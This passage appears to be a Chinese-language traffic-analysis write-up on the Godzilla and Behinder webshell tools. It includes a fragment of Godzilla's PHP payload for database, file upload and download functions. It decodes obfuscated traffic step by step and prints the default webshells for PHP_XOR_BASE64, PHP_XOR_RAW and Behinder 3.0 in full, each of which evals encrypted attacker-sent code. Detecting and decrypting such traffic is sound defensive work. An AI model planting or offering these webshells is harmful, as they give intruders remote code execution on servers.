$dbConfig=array(\"UID\"=&gt; $username,\"PWD\"=&gt;$password); if (!empty($currentDb)){ $dbConfig[\"Database\"]=$currentDb; } $T=@sqlsrv_connect($host,$dbConfig); $q=@sqlsrv_query($T,$sql,null); if($q!==false){ $i=0; $fm=@sqlsrv_field_metadata($q); if(empty($fm)){ $ar=@sqlsrv_rows_affected($q); return \"Query OK, \".$ar.\" rows affected\"; }else{ $data = \"ok\\n\"; foreach($fm as $rs){ $data.=base64_encode($rs['Name']).\"\\t\"; $i++; } $data.= \"\\n\"; while($rs=@sqlsrv_fetch_array($q,SQLSRV_FETCH_NUMERIC)){ for($c=0;$c&lt;$i;$c++){ $data.=base64_encode(trim($rs[$c])).\"\\t\"; } $data.= \"\\n\"; } return $data; } }else{ $err=\"\"; if(($e = sqlsrv_errors()) != null){ foreach($e as $v){ $err.=($e['message']).\"\\n\"; } } return $err; } } function mssql_exec($host, $port, $username, $password, $execType,$currentDb, $sql){ $T=@mssql_connect($host,$username,$password); if (!empty($currentDb)){ @mssql_select_db($currentDb); } $q=@mssql_query($sql,$T); if(is_bool($q)){ return \"Query OK, \".@mssql_rows_affected($T).\" rows affected\"; }else{ $data = \"ok\\n\"; $i=0; while($rs=@mssql_fetch_field($q)){ $data.=base64_encode($rs-&gt;name).\"\\t\"; $i++; } $data.=\"\\n\"; while($rs=@mssql_fetch_row($q)){ for($c=0;$c&lt;$i;$c++){ $data.=base64_encode(trim($rs[$c])).\"\\t\"; } $data.=\"\\n\"; } @mssql_free_result($q); @mssql_close($T); return $data; } } function oci_exec($host, $port, $username, $password, $execType, $currentDb, $sql, $charset) { $chs = $charset ? $charset : \"utf8\"; $mod = 0; $H = @oci_connect($username, $password, $host, $chs, $mod); if (!$H) { $errObj=@oci_error(); return $errObj[\"message\"]; } else { $q = @oci_parse($H, $sql); if (@oci_execute($q)) { $n = oci_num_fields($q); if ($n == 0) { return \"Query OK, \".@oci_num_rows($q).\" rows affected\"; } else { $data = \"ok\\n\"; for ($i = 1; $i &lt;= $n; $i++) { $data.= base64_encode(oci_field_name($q, $i)).\"\\t\"; } $data.= \"\\n\"; while ($row = @oci_fetch_array($q, OCI_ASSOC + OCI_RETURN_NULLS)) { foreach($row as $item) { $data.= base64_encode($item !== null ? base64_encode($item) : \"\"). \"\\t\"; } $data.= \"\\n\"; } return $data; } } else { $e = @oci_error($q); if ($e) { return \"ERROR://{$e['message']} in [{$e['sqltext']}] col:{$e['offset']}\"; } else { return \"false\"; } } } } function ora_exec($host, $port, $username, $password, $execType, $currentDb, $sql, $charset) { $H = @ora_plogon(\"{$username}@{$host}\", \"{$password}\"); if (!$H) { return \"Login Failed!\"; } else { $T = @ora_open($H); @ora_commitoff($H); $q = @ora_parse($T, \"{$sql}\"); $R = ora_exec($T); if ($R) { $n = ora_numcols($T); $data=\"ok\\n\"; for ($i = 0; $i &lt; $n; $i++) { $data.=base64_encode(Ora_ColumnName($T, $i)).\"\\t\"; } $data.=\"\\n\"; while (ora_fetch($T)) { for ($i = 0; $i &lt; $n; $i++) { $data.=base64_encode(trim(ora_getcolumn($T, $i))).\"\\t\"; } $data.=\"\\n\"; } return $data; } else { return \"false\"; } } } function sqlite_exec($host, $port, $username, $password, $execType, $currentDb, $sql, $charset) { $dbh=new SQLite3($host); if(!$dbh){ return \"ERROR://CONNECT ERROR\".SQLite3::lastErrorMsg(); }else{ $stmt=$dbh-&gt;prepare($sql); if(!$stmt){ return \"ERROR://\".$dbh-&gt;lastErrorMsg(); } else { $result=$stmt-&gt;execute(); if(!$result){ return $dbh-&gt;lastErrorMsg(); }else{ $bool=True; $data=\"ok\\n\"; while($res=$result-&gt;fetchArray(SQLITE3_ASSOC)){ if($bool){ foreach($res as $key=&gt;$value){ $data.=base64_encode($key).\"\\t\"; } $bool=False; $data.=\"\\n\"; } foreach($res as $key=&gt;$value){ $data.=base64_encode($value!==NULL?$value:\"NULL\").\"\\t\"; } $data.=\"\\n\"; } if($bool){ if(!$result-&gt;numColumns()){ return \"Query OK, \".$dbh-&gt;changes().\" rows affected\"; }else{ return \"ERROR://Table is empty.\"; } }else{ return $data; } } } $dbh-&gt;close(); } } function pdoExec($databaseType,$host,$port,$username,$password,$execType,$currentDb,$sql){ $conn=null; if ($databaseType===\"oracle\"){ $databaseType=\"orcl\"; } if (strpos($host,\"=\")!==false){ $conn = new PDO($host, $username, $password); }else if (!empty($currentDb)){ $conn = new PDO(\"{$databaseType}:host=$host;port={$port};dbname={$currentDb}\", $username, $password); }else{ $conn = new PDO(\"{$databaseType}:host=$host;port={$port};\", $username, $password); } $conn-&gt;setAttribute(3, 0); if ($execType==\"update\"){ $affectRows=$conn-&gt;exec($sql); if ($affectRows!==false){ return \"Query OK, \".$conn-&gt;exec($sql).\" rows affected\"; }else{ return \"Err-&gt;\\n\".implode(',',$conn-&gt;errorInfo()); } }else{ $data=\"ok\\n\"; $stm=$conn-&gt;prepare($sql); if ($stm-&gt;execute()){ $row=$stm-&gt;fetch(2); $_row=\"\\n\"; foreach (array_keys($row) as $key){ $data.=base64_encode($key).\"\\t\"; $_row.=base64_encode($row[$key]).\"\\t\"; } $data.=$_row.\"\\n\"; while ($row=$stm-&gt;fetch(2)){ foreach (array_keys($row) as $key){ $data.=base64_encode($row[$key]).\"\\t\"; } $data.=\"\\n\"; } return $data; }else{ return \"Err-&gt;\\n\".implode(',',$stm-&gt;errorInfo()); } } } if ($dbType==\"mysql\"&amp;&amp;(class_exists(\"mysqli\")||function_existsEx(\"mysql_connect\")||function_existsEx(\"mysqli_connect\"))){ if (class_exists(\"mysqli\")){ return mysqli_exec($dbHost,$dbPort,$username,$password,$execType,$currentDb,$execSql,$charset); }elseif (function_existsEx(\"mysql_connect\")){ return mysql_exec($dbHost,$dbPort,$username,$password,$execType,$currentDb,$execSql,$charset); }else if (function_existsEx(\"mysqli_connect\")){ return mysqliEx_exec($dbHost,$dbPort,$username,$password,$execType,$currentDb,$execSql,$charset); } }elseif ($dbType==\"postgresql\"&amp;&amp;function_existsEx(\"pg_connect\")){ if (function_existsEx(\"pg_connect\")){ return pg_execEx($dbHost,$dbPort,$username,$password,$execType,$currentDb,$execSql,$charset); } }elseif ($dbType==\"sqlserver\"&amp;&amp;(function_existsEx(\"sqlsrv_connect\")||function_existsEx(\"mssql_connect\"))){ if (function_existsEx(\"sqlsrv_connect\")){ return sqlsrv_exec($dbHost,$dbPort,$username,$password,$execType,$currentDb,$execSql); }elseif (function_existsEx(\"mssql_connect\")){ return mssql_exec($dbHost,$dbPort,$username,$password,$execType,$currentDb,$execSql); } }elseif ($dbType==\"oracle\"&amp;&amp;(function_existsEx(\"oci_connect\")||function_existsEx(\"ora_plogon\"))){ if (function_existsEx(\"oci_connect\")){ return oci_exec($dbHost,$dbPort,$username,$password,$execType,$currentDb,$execSql,$charset); }else if (function_existsEx(\"ora_plogon\")){ return oci_exec($dbHost,$dbPort,$username,$password,$execType,$currentDb,$execSql,$charset); } }elseif ($dbType==\"sqlite\"&amp;&amp;class_exists(\"SQLite3\")){ return sqlite_exec($dbHost,$dbPort,$username,$password,$execType,$currentDb,$execSql,$charset); } if (extension_loaded(\"pdo\")){ return pdoExec($dbType,$dbHost,$dbPort,$username,$password,$execType,$currentDb,$execSql); }else{ return \"no extension\"; } } function base64Encode($data){ return base64_encode($data); } function test(){ return \"ok\"; } function get($key){ global $parameters; if (isset($parameters[$key])){ return $parameters[$key]; }else{ return null; } } function getAllParameters(){ global $parameters; return $parameters; } function includeCode(){ $classCode=get(\"binCode\"); $codeName=get(\"codeName\"); $_SES=&amp;getSession(); $_SES[$codeName]=$classCode; return \"ok\"; } function base64Decode($string){ return base64_decode($string); } function convertFilePermissions($fileAttr){ $mod=0; if (strpos($fileAttr,'R')!==false){ $mod=$mod+0444; } if (strpos($fileAttr,'W')!==false){ $mod=$mod+0222; } if (strpos($fileAttr,'X')!==false){ $mod=$mod+0111; } return $mod; } function g_close(){ @session_start(); $_SES=&amp;getSession(); $_SES=null; if (@session_destroy()){ return \"ok\"; }else{ return \"fail!\"; } } function bigFileDownload(){ $mode=get(\"mode\"); $fileName=get(\"fileName\"); $readByteNum=get(\"readByteNum\"); $position=get(\"position\"); if ($mode==\"fileSize\"){ return @filesize($fileName).\"\"; }elseif ($mode==\"read\"){ if (function_existsEx(\"fopen\")&amp;&amp;function_existsEx(\"fread\")&amp;&amp;function_existsEx(\"fseek\")){ $handle=fopen($fileName,\"rb\"); if ($handle!==false){ @fseek($handle,$position); $data=fread($handle,$readByteNum); @fclose($handle); if ($data!==false){ return $data; }else{ return \"cannot read file\"; } }else{ return \"cannot open file\"; } }else if (function_existsEx(\"file_get_contents\")){ return file_get_contents($fileName,false,null,$position,$readByteNum); }else{ return \"no function\"; } }else{ return \"no mode\"; } } function bigFileUpload(){ $fileName=get(\"fileName\"); $fileContents=get(\"fileContents\"); $position=get(\"position\"); if(function_existsEx(\"fopen\")&amp;&amp;function_existsEx(\"fwrite\")&amp;&amp;function_existsEx(\"fseek\")){ $handle=fopen($fileName,\"ab\"); if ($handle!==false){ fseek($handle,$position); $len=fwrite($handle,$fileContents); @fclose($handle); if ($len!==false){ return \"ok\"; }else{ return \"cannot write file\"; } }else{ return \"cannot open file\"; } }else if (function_existsEx(\"file_put_contents\")){ if (file_put_contents($fileName,$fileContents,FILE_APPEND)!==false){ return \"ok\"; }else{ return \"writer fail\"; } }else{ return \"no function\"; } } function canCallGzipEncode(){ if (function_existsEx(\"gzencode\")){ return \"1\"; }else{ return \"0\"; } } function canCallGzipDecode(){ if (function_existsEx(\"gzdecode\")){ return \"1\"; }else{ return \"0\"; } } function bytesToInteger($bytes, $position) { $val = 0; $val = $bytes[$position + 3] &amp; 0xff; $val &lt;&lt;= 8; $val |= $bytes[$position + 2] &amp; 0xff; $val &lt;&lt;= 8; $val |= $bytes[$position + 1] &amp; 0xff; $val &lt;&lt;= 8; $val |= $bytes[$position] &amp; 0xff; return $val; } function isGzipStream($bin){ if (strlen($bin)&gt;=2){ $bin=substr($bin,0,2); $strInfo = @unpack(\"C2chars\", $bin); $typeCode = intval($strInfo['chars1'].$strInfo['chars2']); switch ($typeCode) { case 31139: return true; default: return false; } }else{ return false; } } function getBytes($string) { $bytes = array(); for($i = 0; $i &lt; strlen($string); $i++){ array_push($bytes,ord($string[$i])); } return $bytes; }\n内容包含了文件操作、执行命令等诸多模块，方便后续调用。\nPHP_EVEAL_XOR_BASE64这个shell脚本并无特别，一句话脚本上传即可。在流上与PHP_XOR_BASE64上的区别很明显，PHP_XOR_BASE64是key=加密，PHP_EVEAL_XOR_BASE64是pass=加密&amp;key=加密，那么我们需要考虑的部分在于pass后面跟了什么内容由流可得：\npass=eval%28base64_decode%28strrev%28urldecode%28%27\nurl解码：\npass=eval(base64_decode(strrev(urldecode('\n即是这段加密信息解密的方法：\nK0QfK0QfgACIgoQD9BCIgACIgACIK0wOpkXZrRCLhRXYkRCKlR2bj5WZ90VZtFmTkF2bslXYwRyWO9USTNVRT9FJgACIgACIgACIgACIK0wepU2csFmZ90TIpIybm5WSzNWazFmQ0V2ZiwSY0FGZkgycvBnc0NHKgYWagACIgACIgAiCNsXZzxWZ9BCIgAiCNsTK2EDLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKpkXZrRCLpEGdhRGJo4WdyBEKlR2bj5WZoUGZvNmbl9FN2U2chJGIvh2YlBCIgACIgACIK0wOpYTMsADLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKkF2bslXYwRCKsFmdllQCK0QfgACIgACIgAiCNsTK5V2akwCZh9Gb5FGckgSZk92YuVWPkF2bslXYwRCIgACIgACIgACIgAiCNsXKlNHbhZWP90TKi8mZul0cjl2chJEdldmIsQWYvxWehBHJoM3bwJHdzhCImlGIgACIgACIgoQD7kSeltGJs0VZtFmTkF2bslXYwRyWO9USTNVRT9FJoUGZvNmbl1DZh9Gb5FGckACIgACIgACIK0wepkSXl1WYORWYvxWehBHJb50TJN1UFN1XkgCdlN3cphCImlGIgACIK0wOpkXZrRCLp01czFGcksFVT9EUfRCKlR2bjVGZfRjNlNXYihSZk92YuVWPhRXYkRCIgACIK0wepkSXzNXYwRyWUN1TQ9FJoQXZzNXaoAiZppQD7cSY0IjM1EzY5EGOiBTZ2M2Mn0TeltGJK0wOnQWYvxWehB3J9UWbh5EZh9Gb5FGckoQD7cSelt2J9M3chBHJK0QfK0wOERCIuJXd0VmcgACIgoQD9BCIgAiCNszYk4VXpRyWERCI9ASXpRyWERCIgACIgACIgoQD70VNxYSMrkGJbtEJg0DIjRCIgACIgACIgoQD7BSKrsSaksTKERCKuVGbyR3c8kGJ7ATPpRCKy9mZgACIgoQD7lySkwCRkgSZk92YuVGIu9Wa0Nmb1ZmCNsTKwgyZulGdy9GclJ3Xy9mcyVGQK0wOpADK0lWbpx2Xl1Wa09FdlNHQK0wOpgCdyFGdz9lbvl2czV2cApQD\n将加密url解密后：\nK0QfK0QfgACIgoQD9BCIgACIgACIK0wOpkXZrRCLhRXYkRCKlR2bj5WZ90VZtFmTkF2bslXYwRyWO9USTNVRT9FJgACIgACIgACIgACIK0wepU2csFmZ90TIpIybm5WSzNWazFmQ0V2ZiwSY0FGZkgycvBnc0NHKgYWagACIgACIgAiCNsXZzxWZ9BCIgAiCNsTK2EDLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKpkXZrRCLpEGdhRGJo4WdyBEKlR2bj5WZoUGZvNmbl9FN2U2chJGIvh2YlBCIgACIgACIK0wOpYTMsADLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKkF2bslXYwRCKsFmdllQCK0QfgACIgACIgAiCNsTK5V2akwCZh9Gb5FGckgSZk92YuVWPkF2bslXYwRCIgACIgACIgACIgAiCNsXKlNHbhZWP90TKi8mZul0cjl2chJEdldmIsQWYvxWehBHJoM3bwJHdzhCImlGIgACIgACIgoQD7kSeltGJs0VZtFmTkF2bslXYwRyWO9USTNVRT9FJoUGZvNmbl1DZh9Gb5FGckACIgACIgACIK0wepkSXl1WYORWYvxWehBHJb50TJN1UFN1XkgCdlN3cphCImlGIgACIK0wOpkXZrRCLp01czFGcksFVT9EUfRCKlR2bjVGZfRjNlNXYihSZk92YuVWPhRXYkRCIgACIK0wepkSXzNXYwRyWUN1TQ9FJoQXZzNXaoAiZppQD7cSY0IjM1EzY5EGOiBTZ2M2Mn0TeltGJK0wOnQWYvxWehB3J9UWbh5EZh9Gb5FGckoQD7cSelt2J9M3chBHJK0QfK0wOERCIuJXd0VmcgACIgoQD9BCIgAiCNszYk4VXpRyWERCI9ASXpRyWERCIgACIgACIgoQD70VNxYSMrkGJbtEJg0DIjRCIgACIgACIgoQD7BSKrsSaksTKERCKuVGbyR3c8kGJ7ATPpRCKy9mZgACIgoQD7lySkwCRkgSZk92YuVGIu9Wa0Nmb1ZmCNsTKwgyZulGdy9GclJ3Xy9mcyVGQK0wOpADK0lWbpx2Xl1Wa09FdlNHQK0wOpgCdyFGdz9lbvl2czV2cApQD\n再将代码逆序排列：\nDQpAc2Vzc2lvbl9zdGFydCgpOw0KQHNldF90aW1lX2xpbWl0KDApOw0KQGVycm9yX3JlcG9ydGluZygwKTsNCmZ1bmN0aW9uIGVuY29kZSgkRCwkSyl7DQogICAgZm9yKCRpPTA7JGk8c3RybGVuKCREKTskaSsrKSB7DQogICAgICAgICRjID0gJEtbJGkrMSYxNV07DQogICAgICAgICREWyRpXSA9ICREWyRpXV4kYzsNCiAgICB9DQogICAgcmV0dXJuICREOw0KfQ0KJHBhc3M9J2tleSc7DQokcGF5bG9hZE5hbWU9J3BheWxvYWQnOw0KJGtleT0nM2M2ZTBiOGE5YzE1MjI0YSc7DQppZiAoaXNzZXQoJF9QT1NUWyRwYXNzXSkpew0KICAgICRkYXRhPWVuY29kZShiYXNlNjRfZGVjb2RlKCRfUE9TVFskcGFzc10pLCRrZXkpOw0KICAgIGlmIChpc3NldCgkX1NFU1NJT05bJHBheWxvYWROYW1lXSkpew0KICAgICAgICAkcGF5bG9hZD1lbmNvZGUoJF9TRVNTSU9OWyRwYXlsb2FkTmFtZV0sJGtleSk7DQogICAgICAgIGlmIChzdHJwb3MoJHBheWxvYWQsImdldEJhc2ljc0luZm8iKT09PWZhbHNlKXsNCiAgICAgICAgICAgICRwYXlsb2FkPWVuY29kZSgkcGF5bG9hZCwka2V5KTsNCiAgICAgICAgfQ0KCQlldmFsKCRwYXlsb2FkKTsNCiAgICAgICAgZWNobyBzdWJzdHIobWQ1KCRwYXNzLiRrZXkpLDAsMTYpOw0KICAgICAgICBlY2hvIGJhc2U2NF9lbmNvZGUoZW5jb2RlKEBydW4oJGRhdGEpLCRrZXkpKTsNCiAgICAgICAgZWNobyBzdWJzdHIobWQ1KCRwYXNzLiRrZXkpLDE2KTsNCiAgICB9ZWxzZXsNCiAgICAgICAgaWYgKHN0cnBvcygkZGF0YSwiZ2V0QmFzaWNzSW5mbyIpIT09ZmFsc2Upew0KICAgICAgICAgICAgJF9TRVNTSU9OWyRwYXlsb2FkTmFtZV09ZW5jb2RlKCRkYXRhLCRrZXkpOw0KICAgICAgICB9DQogICAgfQ0KfQ0K\n然后再base64解码：\n\n@session_start();\n@set_time_limit(0);\n@error_reporting(0);\nfunction encode($D,$K){\n  for($i=0;$i&lt;strlen($D);$i++) {\n    $c = $K[$i+1&amp;15];\n    $D[$i] = $D[$i]^$c;\n  }\n  return $D;\n}\n$pass='key';\n$payloadName='payload';\n$key='3c6e0b8a9c15224a';\nif (isset($_POST[$pass])){\n  $data=encode(base64_decode($_POST[$pass]),$key);\n  if (isset($_SESSION[$payloadName])){\n    $payload=encode($_SESSION[$payloadName],$key);\n    if (strpos($payload,\"getBasicsInfo\")===false){\n      $payload=encode($payload,$key);\n    }\n    eval($payload);\n    echo substr(md5($pass.$key),0,16);\n    echo base64_encode(encode(@run($data),$key));\n    echo substr(md5($pass.$key),16);\n  }else{\n    if (strpos($data,\"getBasicsInfo\")!==false){\n      $_SESSION[$payloadName]=encode($data,$key);\n    }\n  }\n}\n\n即是PHP_XOR_BASE64的默认shell，至于后面key的编码和PHP_XOR_BASE64解密方法一致，可参考上面小节。\nPHP_XOR_RAW对应的默认木马文件：\n&lt;?php\n@session_start();\n@set_time_limit(0);\n@error_reporting(0);\nfunction encode($D,$K){\n    for($i=0;$i&lt;strlen($D);$i++) {\n        $c = $K[$i+1&amp;15];\n        $D[$i] = $D[$i]^$c;\n    }\n    return $D;\n}\n$payloadName='payload';\n$key='3c6e0b8a9c15224a';\n$data=file_get_contents(\"php://input\");\nif ($data!==false){\n    $data=encode($data,$key);\n    if (isset($_SESSION[$payloadName])){\n        $payload=encode($_SESSION[$payloadName],$key);\n        if (strpos($payload,\"getBasicsInfo\")===false){\n            $payload=encode($payload,$key);\n        }\n\t\teval($payload);\n        echo encode(@run($data),$key);\n    }else{\n        if (strpos($data,\"getBasicsInfo\")!==false){\n            $_SESSION[$payloadName]=encode($data,$key);\n        }\n    }\n}\n\n这里根据shell可以得到 解密过程更简单一点，但它需要提取二进制数据进行解密，直接用wireshark有点麻烦就在哥斯拉的shell里添了：\n$b = file_put_contents('raw.txt', $data);\n将二进制文本存了下来，然后直接读取解密：\n&lt;?php \n@session_start();\n@set_time_limit(0);\n@error_reporting(0);\nfunction encode($D,$K){\n    for($i=0;$i&lt;strlen($D);$i++) {\n        $c = $K[$i+1&amp;15];\n        $D[$i] = $D[$i]^$c;\n    }\n    return $D;\n}\n$pass='pass';\n$payloadName='payload';\n$key='3c6e0b8a9c15224a';\n\n\n\n$file_path = \"raw.txt\";\nif (file_exists($file_path)) {\n    $fp = fopen($file_path, \"r\");\n    $post = fread($fp, filesize($file_path));\n    $post = str_replace(\"\\r\\n\", \"\n\", $post);\n}\n\n\n#$post = \"\";\n\n\n#echo base64_decode($post);\necho \"&lt;br/&gt;\";\necho \"&lt;br/&gt;\";\n\n#$data=encode(base64_decode($post),$key);\n$data=encode(($post),$key);\necho $data;\n\n冰蝎3.0这里还是以php为例，默认shell如下：\n&lt;?php\n@error_reporting(0);\nsession_start();\n    $key=\"a02439ec229d8be0\"; //该密钥为连接密码32位md5值的前16位，默认连接密码POST\n\t$_SESSION['k']=$key;\n\tsession_write_close();\n\t$post=file_get_contents(\"php://input\");\n\tif(!extension_loaded('openssl'))\n\t{\n\t\t$t=\"base64_\".\"decode\";\n\t\t$post=$t($post.\"\");\n\t\t\n\t\tfor($i=0;$i&lt;strlen($post);$i++) {\n    \t\t\t $post[$i] = $post[$i]^$key[$i+1&amp;15]; \n    \t\t\t}\n\t}\n\telse\n\t{\n\t\t$post=openssl_decrypt($post, \"AES128\", $key);\n\t}\n    $arr=explode('|',$post);\n    $func=$arr[0];\n    $params=$arr[1];\n\tclass C{public function __invoke($p) {eval($p.\"\");}}\n    @call_user_func(new C(),$params);\n?&gt;\n\n由shell可得冰蝎所进行ase加密的恶意代码，这里解密需要密钥，而密钥是由设置连接密码32位md5加密的前16位组成，整体解法并不复杂。\n2L40NUw3Mv00wTIlVK7Jz4FY4xOvRXtym/xSmP20i+wHTDZpqs0PHF7j3BzBDhZlPVbkI8iaBWjGuwdmzA8CfTOxPkH547xm5v8GyO7utOD/HuDO/LVXdKL6swAu4sGlBtEaK8FDyETSfNYiYmcfkaQYGUMTt1jjFE0EYckfjMh+9muc7UGO8K5EIGcwF8LdtuNeH0QOv2nBEarF9R53r9X2JdWfBungKXiOGVbWdNEiUTG3NU5Mlem0r+Vvsvv19HQLTtNlBPB7M8tDE0LtSktjPgt5n50+rJe3bLKMnI/aaoHNe8bcfbiLSk13Fn5D8dXwkf8vN6OaVDVq+Dn3qaCORhOSX+36YvzAgmdWWYb7e0TAAHK9UTlifPZGyCzt7DFUipMIpeEdNqdfh4TN2TSy/Dua8FiIutMA5pI9zrkC/g/OAqK3C6PsfvQOQSkoYkA3uS0/GK+oMiIplS3VLtxqtKpgS3a4IC6yHn/dZnwPpf32lzuzGfRnhOIluqXqzvLyxJC7mKhMj0IjVjztm6XKbi2Nki2DAQVh36gdHCC6by4Ut/2err6VZDrIQUrWycdZzCCu2OD1FFAZzUOiQ++PxUS2rOc5K+I2NnLgGePpj6VOmDbOibLrfrFG0nQOHXkpK4r+XKRypn21dDB7tg2N3Q8PXdmkygpGTic8dU98KA/hqog0uWoNOEVo6KbIScewGuTEvOlGiObfTPfZCW5n0oW6nonx8ljzVy1MU3MvcH6vkTNhpcUbuInyND8DMqdpi+MvfPlX0tuD9AE5G9F533u2ovGNCQroyFuFwNAu7ovUzpML1AsBaFTbdQKgo5d4YNdIBE6/kFW30b6WQMOg8cok2R+9mowbtp/4P77/ruY+mhp4Gba1cCINXeWv9rWQYr1tn2a34Pe09Z4g1vN8xjdyHE5PMs1mpAWog6eE1ZLiXSrHsT2Bj85BnZhVVlqMym6NMVm3uLCqiX0J6ul+zILAYQivDOzMxNpdCFojitJ5G3DSL5wk/U+xZoSz8mCrA2ovuaSvDknw+bBSORJv5xC8otDLV3g/5dBuAjDlOkbSD4MfL3MfdvIq6g0d807G9txdQk4/IyBtlz9HFu4LZ4bHB/3N8MmnDP1DZEfJ1zjakmHFMJMkntoda4xBsuz4C/QYykF3ctZ8azJPHmtG0ruvMPO1le1wqINkkZy2GsJDVxJV2n1Fb4NYdGxiydoU9so+NtGCPr3bbmj/AxlplfHLzzC9nJ4yOn3Su9YzYxrgpcvj6z7GPhM2b1UOWQPzNwDtgWMTXVrGtZ7JJscx00G3P7akErCmodWRyU+9Lch5FFvCxjc/48k2Dpja91Y5dqsVVJZ8FmHHN39oweIBiE6n21ShMhB4D+BW+jLK11GmlRCcrj0leZUh8pTPd0E6K/JFJMIozcolxXpa8hY8snvC9BiNdMg2ltrD0yj64eqvTMBWJqYY3oMckenhix/fUEX7jCMABsiUWDeYrf/ds4i1NWxcAnnARcTnVoqLIaSzd9CUTmUdQrfVJbZ2ghTqsY0qQ8dVteGcXyD8ehMf1ClgKDx0akUcVMzJfQRiX2X1Uv5RRuC64hGuRo2wMn0uKqZqMSU1Yf1KiDw5R/m0hZjB30+8Cr6d+RCxp2bPWvdXrPrJasCHhhqx7kHi/RPqjO0rpl/y01pK5MVe6AUBZoGcsFwzML911PdtdXAEjPaFZqAu829efqTMS9wDBO7F4n+l93rgsdEY0ejrq/R/jbhprzReX/8tvGRPAzSFd6OS+BKAZYZ3PcMGcGTp4v1/SnM/DVx1B6sOpztsQ65ZzDPWa+iudfxdhiKlY+smt2uJCC413enKyGwJ+X+PtkS1yBB0im+xNuCOrC7Qn72Q2TW/VjQmHaPpQVoLLJ5cIorBLnLxlk63dZsd4to5+xISEru4utDoART3MS+IRgxVe1af89yerrVdyO+/6IVNLz/N9alZ2i1LRnAiY5FovPB+IJjo0xNqqEiGCF3B2hEl9/C9XaXbk5lVi/JhGcA5r0CNgn4i6ROqL8fgrqbZ0h53hf9TAotoTV9B9NiufGDxn/slXDu1km6Oqd1YA/EKrKLTlNkd0GKvWBEnYEqx+82eJ8yTUTRWPyl63jh6kgNKHbqU+e840JF1bOMy5+JBuH9jhrSak8HVdU9j4ey3A6tldMKagq1s8swjcXmMsVB3LNoMJN90/k0TTRj9oM2VYLz1eknBKtxR8g3Nnrpo4KOrk2C1mrsFoPoptJgocyX9YQMUyrVx9qPRvjRggJnV2ANWO4mLze1rHGPAAMLG8Wof8sgNSp4UbOqd9aykJ87JUXtn1X3TT6WDmFZPrYWf7uzJ63AIfOKn9ZSs0DTfLOJGsHEqzWP2rWG1aH/CnEb0HBF6bov2qhwUSg6W77NhEuqYZ/X8pbfbDzRBU/IZTUidvIxQFLSOSp8bYB08ROeIhtFF9CDKb3mcwIbP/AL5bQ+PD1I5LZ/Nrmp5jXs3AI+WTn/SBjsaai9JayciOON4gOJtuXW5W/xDAWpT3qhOW0CmEX2/C0fyadgIVXDrNcQ8QCANuvMc3v1yUiDbijCPya14rx/5SoWqHsusPm9LbdNcTDBPkP/fE2Mvo81iQP0iQy7hIExPOb1gBSh2KcJsSeruRO65/PUx+/JLezWee4eRWwH/7uRzQY7q+mrYlBj0vCIckMiPp5CR9oeUs4gdlxhqL4ObV9y8F5dckigcm7RVs2gRU7HT4BHxtfuf6mRwO99ocrSvlcBz0aTDmVdQ7dQMSzfhgPhCqtSQSpeohbwFQYUYAKIJppOX7cxhXJmaZJA4ykzRZN/nimUCkUEZEBystBfve6ZXNSgQTR7jU14q9w+Fq4nG+11Q/EmdqWoZ615gZ0ANGAugixjJZ+9mHRlphfzyJo8c/d4U1nNkzx/D1Tk6WDarwdicqMEGlkxQC8swqvndAYAUTedIpKVnkRu+TBPoDvbBvb2XQgLV/LvcZXSqKbWQ0Lm0u7ZW5GwT4ZNIoPpaxrCMCe0TcpR8+OtJWhaiCk4RDG9eEiNENmZVCLDSjK1q19i4051UVVjWQtY+hh7tWkxAWu/eSTSQsbP9m5ddPF4yCltClHP040G5fGIB23sSrlHGQnLIFoXMURB6hMjKL0S8m4AAIDwyLvjdlQ/K4HjHA48tcAWFQMSus4oO4uFouP4kiQi19ucpjq7uilBWbe8ktWebTz8ZyHNi+MQjdpD2vSWh4SL7rALJFqXShjOCJPWlpTqa5Y08JdfxlyFldZhWyo6IoEwXMxj08QOEo+sIkOVmmwUbMuiZ88OWlflnHcbcO8mfMB0r0RNPs16F9fb4VV596GzMpKIqiHvrz8BI0PRPhcbDtpaeQyD8AHRHMHzLcf3g1V9Fwpt4EgIvnPd3qrn4BiYjcbm9+t8bDyP905zyX8HeRskCbv/De7DzeuiTa2WIj4ERKkG+P7zePkTScnYUWITcnG3Ui63rfsgM4pV1omtrIPmV2oGunCAFO1uTQHYu4Z9u64Gs/fBoRAO7oM+AnXywoNIjl8Hx3AivGnciwhuxJm1mCFHkdnNLjU7yGKkuX6UoX4+QKkUroX/gg04b9Z4Vzm2WsQMfGO5VAVRbEOj61FrQlyCM+oYSO2A9aL74BlM972BYqqlGb8nLLKyBPpGrfwsPDR2mTZdz1sRSsRI2ItXR7wZjikxHCsVKsxgJGCna9iHiW6DZ5aIuhbUIhrVUVh8ws42qi3FyInGGBXTZU2EmETOzBBuiWBe+5gSQVRJ6nRe2ZsVhQoZJzJ1K6p6rae2Kp4wRD15kEN02kZZztuQGW9Lo2mPieZqRGFxWHiDy+nDTM1up1lCrDM5aoTPWS7G2efBwEj3uWigrPoc/6uzsbnMZa/pInWnXa3xGUca8X1gf3Rp1djsTpkyAjFVAMih6nGvemcoJCEINvne/Aq/ecvW+rP9TBkr/rXIrnaJjNHPCeYNOjl/C+LV+3EGJ/nBwsvbbb0+LpAS0uUjU2lszk3uPb9dsm29w1ZZoiku56Ab4h4wON/XHZ2z7qbRV4g4ISEcNTJdtqj0+D1fEIt4wClabVTgjTSId+4qkkv/OafZKxm8TqMXGxRMDpMSZdP3E8XOmck+MO4VMkabinj3F+yYLWD4IU20tJNKQ08Idz5SQ//E5YCofQYtSEzefMB0BSXxYxU57/Sz3noBaW2w12m74eFQr97nfwQX9JY/qudbrtwVZd1cJjAUEzd5wdb35T24t0AQGkvQAGCpZlIu0k33N6rNXOYXKeE8cDx+gnzwcGOOGxqvhrTPXP8NciPOKNv/5j0SMT0f4FBnNinaeRTX5IFseh4CO9OrO4xk8cI56o76BJFra8bUWqBEO83z37yD8cVk9XthxXYaHKmZur2AOuBpRBnmQqv36WvKRCReEfKiiYLGCrr1VJpEKrRWDESBvYxRU5IGM2hpcKqRo3+NwpwZsUdhIar6xQrEuWssOk41XuA1CyMpir8Re2LgaJIIRmk3N7mkvgr5/T8p8dFgZVdY1zOndkDOnQjGaKNJcmCYPt20+hXDo1dzVCPC3gDCt